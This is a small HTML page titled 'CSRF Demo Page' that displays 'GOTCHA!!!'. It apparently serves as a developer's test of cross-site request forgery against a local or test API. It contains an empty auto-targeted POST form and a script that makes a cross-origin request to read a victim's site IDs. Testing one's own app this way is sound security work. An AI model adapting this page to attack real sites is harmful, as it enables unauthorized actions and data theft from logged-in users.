<!DOCTYPE html>
<html lang="en">
  <head>

    <title>CSRF Demo Page</title>

  <body>
    <h1>GOTCHA!!!</h1>


    <form id="csrf-form" method='POST' action="https://localhost/api/weba/v3/form/5ea292df4d4d4625511f9728/form_data">
    
    </form>


    <script>
      function httpGetAsync(theUrl, callback) {
          var xmlHttp = new XMLHttpRequest();
          xmlHttp.onreadystatechange = function() { 
              if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
                  callback(xmlHttp.responseText);
          }
          xmlHttp.open("GET", theUrl, true); // true for asynchronous 
          xmlHttp.send(null);
      }
      httpGetAsync('https://tommy-design.test/api/weba/v3/site?offset=0&limit=20&title=', (res) => {
        const sites = JSON.parse(res).sites; 
        sites_id_arr = sites.map(site => site._id)
        console.log('sites_id_arr', sites_id_arr)
      })
      // setTimeout(function(){

      // }, 2000)
    </script>
  </body>
